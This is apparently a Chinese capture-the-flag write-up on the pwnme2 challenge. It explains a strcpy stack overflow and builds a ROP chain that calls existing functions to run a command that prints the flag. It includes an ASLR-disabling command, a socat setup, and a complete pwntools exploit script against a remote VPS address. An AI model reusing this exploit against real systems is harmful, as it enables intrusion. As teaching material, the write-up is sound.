ailx10说：这篇是我2024年4月写的。pwnme2 这题让我第一次更明显地感受到，一次溢出不一定只是跳到某一个函数，还可以把几个已有函数串起来。我顺着题目里的字符串构造过程，把参数和返回地址排成链，再让执行函数接上去。这篇没有把所有地方都说成自己已经彻底懂了：两处中间地址当时我还没想明白，也照样留在记录里。它适合拿来回看当时的尝试和疑问，继续追栈是怎样变化的，而不是只复制那段 ROP 链，就以为每个细节都已经有了解释。

---

本例尝试通过构造返回链，让程序依次调用已有代码；改变的是函数返回地址，而非函数返回值。

**ROP返回导向编程**(Return Oriented Programming)[\[1\]](#ref_1)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**

（1）原记录的样本栈不可执行，并在实验环境中关闭地址随机化。关闭系统级 ASLR 影响整个系统，仅适用于隔离测试。

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

![](/notes-assets/b9e9328ae81b1652f9a3.webp)

（2）因为自己的电脑是MAC M1，所以需要把程序放在x86的VPS上，过socat进行端口转发

```
socat TCP4-LISTEN:10086,reuseaddr,fork,su=nobody EXEC:./pwnme2-ROP基础
```

（3）在本地使用IDA查看main函数，发现一个可疑的 userfunction 函数

![](/notes-assets/e4b43497c97d8c4f7e17.webp)

继续跟进，发现里面包含了 strcpy函数，存在缓冲区溢出漏洞。因为传进来的string长度是128，而buffer只能接受100，因此传进来的string会覆盖userfunction的函数栈，从而控制userfunction函数的返回

![](/notes-assets/55ec609ff352eb70bb30.webp)

（4）观察到这块可以直接输出flag，因此需要构造函数调用栈，来改变函数执行流，去执行我们的exec\_string函数，我们需要构造命令执行的载荷：system(`/bin/cat /home/.flag1`)

![](/notes-assets/fc6b8a7b24f3378aba4e.webp)

- add\_bin\_addr 函数地址是0x08048550，参数是 0xDEADBEEF，往string中写入`/bin`
- add\_sh\_addr 函数地址是0x08048596，参数1是0xCAFEBABE，参数2是0xABADF00D，往string中写入`/cat`
- add\_para\_addr 函数地址是0x080485E5，参数是0xBADCAFEE，往string中写入 `/home/.flag1`
- add\_exec\_string\_addr 函数地址是0x0804853C，调用`system(string)`

```
payload = flat(['a'*0x6C,'b'*4,add_bin_addr,0x08048639,para_bin_1,

add_sh_addr,0x08048638,para_sh_1,para_sh_2,

add_para_addr,0x08048639,para_para_1,

add_exec_string_addr])
```

原作者明确未确认 0x08048639 和 0x08048638 的作用。它们可能参与栈处理，但需要实际 gadget 反汇编才能判断；不能把推测当作事实。

![](/notes-assets/815fb97aff93d655dc3e.webp)

```
# python2.7



from pwn import *



# 设置远程连接信息

host = '174.137.58.6'

port = 10086



para_bin_1 = 0xDEADBEEF

add_bin_addr = 0x08048550



para_sh_1 = 0xCAFEBABE

para_sh_2 = 0xABADF00D

add_sh_addr = 0x08048596



para_para_1 = 0xBADCAFEE

add_para_addr = 0x080485E5



add_exec_string_addr = 0x0804853C



# 构造恶意输入，首先填充缓冲区，然后将getflag函数的地址作为返回地址写入缓冲区

payload = flat(['a'*0x6C,'b'*4,add_bin_addr,0x08048639,para_bin_1,add_sh_addr,0x08048638,para_sh_1,para_sh_2,add_para_addr,0x08048639,para_para_1,add_exec_string_addr])





# 创建一个与目标程序的连接

io = remote(host, port)

# 发送payload给目标程序

io.sendlineafter("Please input:", payload)



# 接收并打印目标程序的输出

print(io.recvall())
```
